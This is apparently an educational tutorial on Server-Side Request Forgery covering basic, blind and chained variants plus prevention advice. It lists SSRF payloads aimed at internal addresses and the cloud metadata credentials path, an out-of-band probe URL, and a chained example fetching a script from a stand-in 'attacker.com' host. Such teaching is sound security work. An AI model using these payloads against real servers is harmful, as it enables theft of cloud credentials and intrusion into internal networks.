# Server-Side Request Forgery (SSRF)

## CONTENTS
1. [Prerequisites](#1-prerequisites)
2. [What is SSRF?](#2-what-is-ssrf)
3. [Impact of SSRF Vulnerabilities](#3-impact-of-ssrf-vulnerabilities)
4. [Common Types of SSRF Vulnerabilities](#4-common-types-of-ssrf-vulnerabilities)
   - [Basic SSRF](#41-basic-ssrf)
   - [Blind SSRF](#42-blind-ssrf)
   - [Chained SSRF](#43-chained-ssrf)
5. [Prevention of SSRF Vulnerabilities](#5-prevention-of-ssrf-vulnerabilities)
6. [References](#6-references)

---

## 1. Prerequisites

### What is SSRF?
Server-Side Request Forgery (SSRF) is a web vulnerability that allows an attacker to manipulate a server into making arbitrary requests to resources they control or internal systems the attacker cannot directly access.

**Key Characteristics**:
1. The attacker sends a crafted request to a vulnerable application.
2. The server, acting as a proxy, executes the attacker’s request to unintended resources.

---

## 2. What is SSRF?

SSRF exploits functionality where a server fetches resources based on user input. By manipulating user-controlled parameters, attackers can:
- Access sensitive internal resources.
- Scan internal networks and services.
- Exploit cloud services or retrieve metadata.

**Example Scenario**:
- An application uses a URL to retrieve content:

`http://example.com/fetch?url=http://trusted.com/resource`

- The attacker manipulates the URL:

`http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/`

This fetches sensitive data from the cloud metadata service.

---

## 3. Impact of SSRF Vulnerabilities

1. **Confidentiality**:
 - Access to sensitive internal resources, such as databases, internal APIs, or cloud metadata.

2. **Integrity**:
 - Ability to perform unauthorized actions, such as modifying server configurations.

3. **Availability**:
 - Can cause denial-of-service (DoS) attacks by overwhelming internal services.

4. **Advanced Exploitation**:
 - SSRF can lead to privilege escalation, remote code execution, or lateral movement within a network.

---

## 4. Common Types of SSRF Vulnerabilities

### 4.1. Basic SSRF

**Theory**  
Basic SSRF allows direct manipulation of user-controlled input to perform unauthorized requests.

**Steps to Find**
1. Locate user inputs that fetch external resources (e.g., URLs, hostnames).
2. Test with payloads to access internal services:
 - `http://127.0.0.1/`
 - `http://169.254.169.254/latest/meta-data/`

**Steps to Exploit**
1. Retrieve sensitive information:
 - `http://127.0.0.1/admin`
 - `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
2. Scan for internal services:
 - `http://10.0.0.1:80`
 - `http://192.168.0.1/private`

---

### 4.2. Blind SSRF

**Theory**  
Blind SSRF occurs when the server processes the attacker's request without providing a visible response. Out-of-band communication channels are often required.

**Steps to Find**
1. Set up an out-of-band (OOB) service such as Burp Collaborator or a DNS logger.
2. Inject OOB payloads:
 - `http://your-oob-server.com`
3. Monitor for requests from the vulnerable server.

**Steps to Exploit**
1. Enumerate internal services using delays:
 - `http://10.0.0.1:80` (200 OK)
 - `http://10.0.0.2:80` (no response)
2. Use DNS rebinding to resolve private IPs:
 - Inject payloads resolving to internal IP ranges.

---

### 4.3. Chained SSRF

**Theory**  
Chained SSRF combines SSRF with other vulnerabilities to achieve a more significant impact.

**Steps to Exploit**
1. Use SSRF to retrieve configuration files or credentials:
 - `http://metadata.internal/latest/meta-data/`
2. Use the retrieved credentials to access internal APIs or services.
3. Trigger secondary vulnerabilities like insecure deserialization or command injection.

**Advanced Example**:
- Fetch malicious scripts:

`http://vulnerable.com/api?fetch=http://attacker.com/malicious-script`

---

## 5. Prevention of SSRF Vulnerabilities

### Input Validation
1. **Allowlist Validation**:
 - Restrict URLs and IPs to a known allowlist.
 - Example:
   - Allow only domains like `trusted.com`.
   - Block private IP ranges such as `127.0.0.1`, `10.0.0.0/8`, and `192.168.0.0/16`.

2. **Reject Unsafe Input**:
 - Block URLs using unsafe protocols (e.g., `file://`, `ftp://`).

---

### Secure Network Configuration
1. **Restrict Server Access**:
 - Limit the server’s ability to communicate with internal resources.
 - Use network segmentation to isolate sensitive systems.

2. **Firewall Rules**:
 - Use a deny-all policy for outgoing requests and allow only necessary destinations.

---

### Additional Measures
1. **Disable URL Redirections**:
 - Prevent redirection chains from bypassing input validation.

2. **Log and Monitor**:
 - Log all outgoing requests.
 - Use monitoring tools to detect abnormal traffic.

---

## 6. References

- [PortSwigger Web Security Academy](https://portswigger.net/web-security/ssrf)  
- [OWASP – SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)  
- [SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)  
